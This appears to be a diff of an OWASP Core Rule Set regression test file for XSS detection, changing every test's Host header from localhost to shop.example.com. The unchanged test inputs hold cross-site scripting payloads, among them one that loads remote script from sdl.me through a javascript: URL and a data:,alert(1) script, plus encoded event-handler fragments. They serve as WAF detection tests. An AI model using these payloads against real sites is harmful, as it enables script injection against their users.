@@ -13,7 +13,7 @@ tests:
           uri: '/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -29,7 +29,7 @@ tests:
           uri: "/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -45,7 +45,7 @@ tests:
           uri: "/get/char_test?mime=text/xml&body=%3Cx%20onend%3D"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -61,7 +61,7 @@ tests:
           uri: "/get/char_test?mime=text/xml&body=%22onzoom%3D"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -77,7 +77,7 @@ tests:
           uri: "/get/char_test?mime=text/xml&body=%27formaction%3D"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -93,7 +93,7 @@ tests:
           uri: "/get/char_test?mime=text/xml&body=%3C%20x%3A%20script"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -109,7 +109,7 @@ tests:
           uri: "/get/char_test?mime=text/xml&body=$%3Cf%20o%20r%20m"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -125,7 +125,7 @@ tests:
           uri: "/get"
           headers:
             User-Agent: "OWASP CRS test agent %3Cf%20o%20r%20m"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -141,7 +141,7 @@ tests:
           uri: "/get"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Referer: 'https://coreruleset.org/?%3Cf%20o%20r%20m'
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
@@ -158,7 +158,7 @@ tests:
           uri: "/get"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Cookie: 'PHPSESSID%3Cf%20o%20r%20m=1234'
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
@@ -175,7 +175,7 @@ tests:
           uri: "/get"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Cookie: 'PHPSESSID=1234%3Cf%20o%20r%20m'
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
@@ -192,7 +192,7 @@ tests:
           uri: "/get?foo%3Cf%20o%20r%20m=bar"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -208,7 +208,7 @@ tests:
           uri: "/get?foo=bar%3Cf%20o%20r%20m"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -220,7 +220,7 @@ tests:
       - input:
           dest_addr: 127.0.0.1
           headers:
-            Host: localhost
+            Host: shop.example.com
             User-Agent: "OWASP CRS test agent"
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           method: POST
@@ -237,7 +237,7 @@ tests:
       - input:
           dest_addr: 127.0.0.1
           headers:
-            Host: localhost
+            Host: shop.example.com
             User-Agent: "OWASP CRS test agent"
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           method: GET
@@ -257,7 +257,7 @@ tests:
           uri: "/get?mime=text/xml&body=$%3Cd%20i%20a%20l%20o%20g"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
@@ -273,7 +273,7 @@ tests:
           uri: "/get?body=%3C%22onwebkitplaybacktargetavailabilitychanged%3D"
           headers:
             User-Agent: "OWASP CRS test agent"
-            Host: localhost
+            Host: shop.example.com
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           version: "HTTP/1.1"
         output:
